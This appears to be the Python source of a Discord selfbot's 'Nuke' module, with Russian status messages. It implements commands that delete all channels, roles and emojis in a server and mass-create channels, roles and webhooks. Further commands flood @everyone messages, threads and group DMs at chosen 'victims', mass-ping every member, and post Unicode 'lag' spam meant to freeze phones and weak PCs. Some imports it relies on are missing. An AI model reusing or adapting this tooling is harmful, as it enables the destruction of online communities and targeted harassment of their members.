from discord.ext import commands
import discord
from asyncio import sleep, create_task
import random
import json

with open("config.json", "r", encoding="utf-8-sig") as f:
	config = json.load(f)

async def remove(object):
	try: await object.delete()
	except: pass
async def check(ctx):
	if not config['OTHER']['nuke_commands']:
		await ctx.message.edit(content='**:warning: Краш команды отключены! Для того чтобы включить краш команды измените файл config.json**')
		return False
	try: await ctx.message.delete()
	except:	pass
	return True
async def create_channel(guild, name):
	try:await guild.create_text_channel(name=name, topic='**https://github.com/PuroSlavKing/Discord-Selfbot**')
	except:pass
async def create_webhook(channel, message):
	try:webhook=await channel.create_webhook(name='Selfbot')
	except:pass
	create_task(spam(webhook, message))
async def spam(webhook, message):
	for i in range(200):
		try:await webhook.send(message, tts=True, username='Selfbot', avatar_url='https://raw.githubusercontent.com/Its-LALOL/Discord-Selfbot/main/cogs/icon.png')
		except:pass
async def edit_channel(channel):
	try: await channel.edit(category=None)
	except: pass
class Nuke(commands.Cog):
	def __init__(self, bot):
		self.bot = bot
	@commands.command()
	async def deletechannels(self, ctx):
		if await check(ctx):
			for channel in ctx.guild.channels:
				create_task(remove(channel))
	@commands.command()
	async def deleteroles(self, ctx):
		if await check(ctx):
			for role in ctx.guild.roles:
				create_task(remove(role))
	@commands.command()
	async def deleteemojis(self, ctx):
		if await check(ctx):
			for emoji in ctx.guild.emojis:
				create_task(remove(emoji))
	@commands.command()
	async def deleteall(self, ctx):
		if await check(ctx):
			create_task(Nuke.deleteroles(self, ctx))
			create_task(Nuke.deleteemojis(self, ctx))
			create_task(Nuke.deletechannels(self, ctx))
	@commands.command()
	async def spamchannels(self, ctx, *, name='Selfbot'):
		if await check(ctx):
			for i in range(50):
				create_task(create_channel(ctx.guild, name))
	@commands.command()
	async def spamwebhooks(self, ctx, *, message='||@everyone|| **__Selfbot__ https://github.com/PuroSlavKing/Discord-Selfbot**'):
		if await check(ctx):
			for channel in ctx.guild.text_channels:
				for webhook in await channel.webhooks():
						create_task(spam(webhook, message))
			for channel in ctx.guild.text_channels:
				create_task(create_webhook(channel, message))
	@commands.command()
	async def spamroles(self, ctx, *, name='Selfbot'):
		if await check(ctx):
			for i in range(50):
				num1=random.randint(0, 225)
				num2=random.randint(0, 225)
				num3=random.randint(0, 225)
				try:await ctx.guild.create_role(name=name, colour=discord.Colour.from_rgb(num1, num2, num3))
				except:return
	@commands.command(aliases=['спам', 'flood', 'флуд'])
	async def spam(self, ctx, amount: int, *, text):
		await ctx.message.delete()
		for i in range(amount):
			await ctx.send(f'{text} ||{"".join(random.choices(string.ascii_uppercase+string.digits+string.ascii_lowercase, k=8))}||')
		await ctx.send(f"**:speaking_head: Успешно отправил {amount} сообщений!**")
	@commands.command(aliases=['пингалл'])
	async def pingall(self, ctx, amount: int=1):
		await ctx.message.delete()
		for i in range(amount):
			text=''
			pinged=0
			for i in ctx.guild.members:
				if len(text)>=1950:
					await ctx.send(text)
					text=''
				if not i.bot and i.id!=self.bot.user.id:
					text+=i.mention
					pinged+=1
			await ctx.send(text)
		await ctx.send(f"**:eye: Успешно пинганул {pinged} пользователей {amount} раз!**")
	@commands.command(aliases=['floodall', 'спамалл', 'флудалл'])
	async def spamall(self, ctx, amount: int, *, text):
		await ctx.message.delete()
		for i in range(amount):
			for channel in ctx.guild.text_channels:
				try: await channel.send(f'{text} ||{"".join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=8))}||')
				except: pass
		await ctx.send(f"**:anger_right: Успешно отправил по {amount} сообщений в каждый канал!**")
	@commands.command(aliases=['spamthread', 'threadspam', 'threadsspam'])
	async def spamthreads(self, ctx, amount: int, *, name):
		await ctx.message.delete()
		for i in range(amount):
			while True:
				response=requests.post(f'https://discord.com/api/v9/channels/{ctx.channel.id}/threads', headers={'authorization': self.bot.http.token}, json={'name': name, 'auto_archive_duration': 1440, 'type': 11})
				if response.status_code==200 or response.status_code==201: break
				elif response.status_code==429:
					seconds=response.json()['retry_after']
					if 100>seconds:
						await sleep(seconds)
				else:
					await ctx.send(f"**Произошла ошибка :x:\n```Код ошибки: {response.status_code}\n{response.text}```**")
					return
		await ctx.send(f"**:thread: Успешно создал {amount} веток!**")
	@commands.command(aliases=['groupspam', 'groupsspam'])
	async def spamgroups(self, ctx, amount: int, *, victims_list):
		await ctx.message.delete()
		victims_ids=victims_list.split(' ')
		for i in range(amount):
			while True:
				response=requests.post('https://discord.com/api/v9/users/@me/channels', headers={'authorization': self.bot.http.token}, json={'recipients': victims_ids})
				if response.status_code==200 or response.status_code==201:
					id=response.json()['id']
					requests.post(f"https://discord.com/api/v9/channels/{id}/messages", headers={'authorization': self.bot.http.token}, json={"content": "||@everyone|| **https://github.com/PuroSlavKing/Discord-Selfbot**"})
					break
				elif response.status_code==429:
					seconds=response.json()['retry_after']
					if 100>seconds:
						await sleep(seconds)
				else:
					await ctx.send(content=f"**Произошла ошибка :x:\n```Код ошибки: {response.status_code}\n{response.text}```**")
					return
		await ctx.send(content=f"**:bubbles: Успешно создал {amount} групп!**")
	@commands.command(aliases=['spamthreadall', 'threadspamall', 'threadsspamall'])
	async def spamthreadsall(self, ctx, amount: int, *, name):
		await ctx.message.delete()
		for i in range(amount):
			for channel in ctx.guild.text_channels:
				while True:
					response=requests.post(f'https://discord.com/api/v9/channels/{channel.id}/threads', headers={'authorization': self.bot.http.token}, json={'name': name, 'auto_archive_duration': 1440, 'type': 11})
					if response.status_code==200 or response.status_code==201 or response.status_code==403: break
					elif response.status_code==429:
						seconds=response.json()['retry_after']
						if 100>seconds:
							await sleep(seconds)
					else:
						await ctx.send(f"**Произошла ошибка :x:\n```Код ошибки: {response.status_code}\n{response.text}```**")
						return
		await ctx.send(f"**:white_flower: Успешно создал по {amount} веток в каждый канал!**")
	@commands.command(aliases=['lag', 'лаг', 'лаги', 'ascii'])
	async def lags(self, ctx, cat='ы', amount: int=15):
		await ctx.message.delete()
		if cat=='random':
			for i in range(amount):
				text=''
				for i in range(2000):
					text=text+chr(random.randrange(1114111))
				await ctx.send(content=text)
		elif cat=='chains':
			text=":chains:"*199
			for i in range(amount):
				char=random.choice(string.digits+string.ascii_letters)
				await ctx.send(text+char)
		elif cat=='phone':
			for i in range(amount):
				char=random.choice(string.digits+string.ascii_letters)
				await ctx.send('О̶̿̏҉͛͑́҉̑͋́҉͐̋͋҉́̌̒҈̀͊̏҉̈́͋́҉̃̎͊҈͛̆̀҉̔̿͋҈̾͒͒҈̀̋̉҉̍̂́҈̃̒̔҈͑̂́҈̉̑̈́҉̌̐́ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰О̶̿̏҉͛͑́҉̑͋́҉͐̋͋҉́̌̒҈̀͊̏҉̈́͋́҉̃̎͊҈͛̆̀҉̔̿͋҈̾͒͒҈̀̋̉҉̍̂́҈̃̒̔҈͑̂́҈̉̑̈́҉̌̐́ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰О̶̿̏҉͛͑́҉̑͋́҉͐̋͋҉́̌̒҈̀͊̏҉̈́͋́҉̃̎͊҈͛̆̀҉̔̿͋҈̾͒͒҈̀̋̉҉̍̂́҈̃̒̔҈ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰О҉҉҉҉҈҉҉҈҉҈҈҉҈҈҈҉ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰О҉҉҉҉҈҉҉҈҉҈҈҉҈҈҈҉ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰О҉҉҉҉҈҉҉҈҉҈҈҉҈҈҈҉ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰О҉҉҉҉҈҉҉҈҉҈҈҉҈҈҈҉ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰О҉҉҉҉҈҉҉҈҉҈҈҉҈҈҈҉ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰О҉҉҉҉҈҉҉҈҉҈҈҉҈҈҈҉ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰ ꙰꙰⃟꙰О҉҉҉҉҈҉҉҈҉҈҈҉҈҈҈҉ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰  ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰О҉҉҉҉҈҉҉҈҉҈҈҉҈҈҈҉ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰О҉҉҉҉҈҉҉҈҉҈҈҉҈ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰О̶̿̏҉͛͑҉҉҉҈҉҉҈҉҈҈҉҈҈҈҉ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰ ꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟'+char)
		elif cat=='emojis':
			emojisdata=EMOJI_DATA
			emojis=[]
			for i in emojisdata:
				emojis.append(i[0])
			for i in range(amount):
				text=''
				for i in range(1000):
					try: text+=random.choice(emojis)
					except: pass
				await ctx.send(text)
		else:
			await ctx.send(content="**:chains:`chains` - Спамит цепями (Лагает на слабых пк)\n:ideograph_advantage:`random` - Спамит случайными символами (Лагает на слабых пк и на телефонах +в дискорде во время спама проиходят баги)\n:mobile_phone:`phone` - Спамит лагающими символами (Очень сильно лагает на телефонах)\n:smiley:`emojis` - Спамит эмодзями (Очень сильно лагает на слабых пк и на телефонах)**")
			return
		await ctx.send(f"**:brain: Успешно отправил {amount} лагающих сообщений!**")
	@commands.command(alises=['channelnuke', 'nuke_channel', 'channel_nuke'])
	async def nukechannel(self, ctx):
		new_channel=await ctx.channel.clone()
		await new_channel.edit(category=ctx.channel.category, position=ctx.channel.position)
		await ctx.channel.delete()
	@commands.command()
	async def nuke(self, ctx):
		if await check(ctx):
			create_task(Nuke.deleteall(self, ctx))
			create_task(Nuke.spamroles(self, ctx))
			create_task(Nuke.spamchannels(self, ctx))
			await sleep(20)
			create_task(Nuke.spamwebhooks(self, ctx))
	@commands.command()
	async def silentnuke(self, ctx, server_id: int=None, *, message='||@everyone|| **__Selfbot__ https://github.com/PuroSlavKing/Discord-Selfbot**'):
		if await check(ctx):
			if server_id is None: server_id=ctx.guild.id
			guild=''
			for guildd in self.bot.guilds:
				if guildd.id==server_id:
					guild=guildd
			for channel in guild.channels:
				create_task(edit_channel(channel))
			for channel in guild.text_channels:
				for webhook in await channel.webhooks():
					create_task(spam(webhook, message))
def setup(bot):
	bot.add_cog(Nuke(bot))
